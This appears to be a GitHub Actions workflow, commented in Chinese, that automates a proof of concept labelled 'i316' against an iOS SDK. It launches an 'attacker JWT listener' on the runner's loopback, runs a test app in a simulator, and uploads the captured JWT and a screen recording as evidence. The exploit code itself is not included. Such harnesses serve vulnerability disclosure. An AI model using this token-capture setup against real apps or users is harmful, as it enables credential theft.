# .github/workflows/i316-poc.yml — i316 远程模拟器验证
#
# 已核实事实:
#   - tag 15.2.0 的 xcframework 含 ios-arm64_x86_64-simulator slice (main 分支精简掉了)
#   - podspec s.source = git tag 15.2.0 → pod install 拉即得官方模拟器 slice
#   - macos-latest = Apple Silicon, Xcode 预装 (macos-14 标签已淘汰)
#   - iOS 模拟器与 runner 宿主共享 loopback → app 连 127.0.0.1:18080 直达监听器
#
# 证据产出: poc-evidence.mp4 (模拟器屏幕录像) + captured-jwt.json + listener.log

name: i316-simulator-poc
on:
  workflow_dispatch:
  push:

jobs:
  poc:
    runs-on: macos-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Start attacker JWT listener (runner loopback)
        run: |
          nohup python3 capture-jwt.py 600 > listener.log 2>&1 &
          sleep 1
          head -2 listener.log

      - name: Generate Xcode project
        run: |
          brew install xcodegen
          xcodegen generate

      - name: Install SDK (tag 15.2.0, 含官方模拟器 slice)
        run: pod install

      - name: Dump FeatureFlagManager signature (诊断)
        if: always()
        run: grep -rn "FeatureFlagManager" Pods/ --include="*.swiftinterface" | head -20 || true

      - name: Build for iOS Simulator (免签名)
        run: |
          xcodebuild -workspace PoC.xcworkspace -scheme PoC \
            -destination 'generic/platform=iOS Simulator' \
            -derivedDataPath dd build CODE_SIGNING_ALLOWED=NO

      - name: Launch on headless simulator + record screen (证据视频)
        run: |
          DEV=$(xcrun simctl list devices available | grep -m1 'iPhone' | sed -E 's/^[[:space:]]*//; s/\([0-9A-Fa-f-]{36}\)//; s/\((Shutdown|Booted)\)//; s/[[:space:]]+$//')
          echo "using device: $DEV"
          xcrun simctl boot "$DEV" 2>/dev/null || true
          echo waiting for boot...
          xcrun simctl bootstatus "$DEV" -b || true
          xcrun simctl install booted dd/Build/Products/Debug-iphonesimulator/PoC.app
          echo "--- app installed at: ---"
          xcrun simctl get_app_container booted com.poc.i316 app 2>&1 || true
          nohup xcrun simctl io booted recordVideo --codec h264 poc-evidence.mp4 >/dev/null 2>&1 &
          echo $! > recorder.pid
          # 启动并捕获 app 控制台输出 90 秒 (崩溃原因也会打出来)
          ( xcrun simctl launch --console-pty booted com.poc.i316 > app-console.log 2>&1 & APID=$!; sleep 90; kill $APID 2>/dev/null; wait $APID 2>/dev/null ) || true
          echo "=== app console (crash reason if any) ==="
          tail -80 app-console.log || true
          # 再常驻启动一次 (若上一步因 console-pty 退出被杀)
          xcrun simctl launch booted com.poc.i316 2>&1 || true
          sleep 60
          # 崩溃日志兜底
          echo "=== crash reports ==="
          ls -t ~/Library/Logs/DiagnosticReports/ 2>/dev/null | head -5 || true
          LATEST=$(ls -t ~/Library/Logs/DiagnosticReports/*.ips 2>/dev/null | head -1)
          if [ -n "$LATEST" ]; then grep -m1 -A3 '"exception"' "$LATEST" || head -40 "$LATEST"; fi

      - name: Show capture result
        run: |
          kill $(cat recorder.pid) 2>/dev/null || pkill -f recordVideo || true
          sleep 3
          cat listener.log || true
          echo "---- captured-jwt.json ----"
          cat captured-jwt.json || echo "(no capture)"

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: i316-capture
          path: |
            listener.log
            captured-jwt.json
            poc-evidence.mp4
